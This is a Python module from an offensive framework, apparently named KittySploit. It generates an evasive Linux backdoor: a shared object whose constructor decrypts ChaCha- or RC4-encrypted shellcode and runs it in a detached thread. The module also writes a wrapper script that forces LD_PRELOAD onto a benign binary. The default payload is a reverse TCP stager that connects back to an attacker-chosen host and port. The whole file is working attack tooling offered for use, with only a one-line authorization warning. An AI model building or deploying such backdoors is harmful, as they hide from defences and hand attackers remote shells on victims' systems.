#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
LD_PRELOAD shared-object evasion.

Generates a malicious .so (constructor runs encrypted shellcode) plus a wrapper
script that sets LD_PRELOAD before launching a benign target binary.
"""

from pathlib import Path

from kittysploit import *
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
from lib.compile.ld_preload import LdPreloadBuilder
from lib.compile.linux_backdoor_helpers import compile_c_so


class Module(Backdoor):
    __info__ = {
        "name": "Linux LD_PRELOAD Evasion",
        "description": (
            "Generate a malicious shared object loaded via LD_PRELOAD. "
            "The .so constructor decrypts and executes shellcode in a detached thread; "
            "a wrapper script forces LD_PRELOAD on a chosen host binary."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1574.006/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    target_binary = OptString("/usr/bin/id", "Benign binary launched via wrapper", False)
    so_name = OptString("libks.so", "Malicious shared object filename", False)
    wrapper_name = OptString("run_preload.sh", "LD_PRELOAD wrapper script filename", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(2000, "Sleep milliseconds before shellcode in .so", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside artifacts", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        raw_payload = generate_payload_bytes(self)
        if not raw_payload:
            return False
        report_payload_size(raw_payload)

        builder = LdPreloadBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        encoded, key, iv = builder.encrypt_payload(raw_payload)
        source = builder.build_so_source(encoded, key, iv)

        out_dir = Path(self.output_dir_path("backdoors/linux/evasion"))
        out_dir.mkdir(parents=True, exist_ok=True)
        so_name = str(option_value(self, "so_name") or "libks.so")
        so_path = out_dir / so_name

        if option_value(self, "save_source"):
            (out_dir / "ld_preload.c").write_text(source, encoding="utf-8")
            print_success(f"C source saved: {out_dir / 'ld_preload.c'}")

        ok = compile_c_so(
            source=source,
            so_path=so_path,
            framework=getattr(self, "framework", None),
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
            extra_args=["-lpthread"],
        )
        if not ok or not so_path.is_file():
            print_error("Shared object compilation failed. Ensure Zig is installed.")
            return False

        wrapper_name = str(option_value(self, "wrapper_name") or "run_preload.sh")
        wrapper_path = out_dir / wrapper_name
        wrapper_path.write_text(
            builder.build_wrapper_script(
                so_path=f"./{so_name}",
                target_binary=str(option_value(self, "target_binary") or "/usr/bin/id"),
            ),
            encoding="utf-8",
        )
        wrapper_path.chmod(0o755)

        print_success(f"Malicious .so generated: {so_path} ({so_path.stat().st_size} bytes)")
        print_success(f"Wrapper script: {wrapper_path}")
        print_info(f"Target binary: {option_value(self, 'target_binary')} | Cipher: {option_value(self, 'cipher')}")
        print_warning("Use only on authorized systems. Run wrapper from the output directory.")
        return True
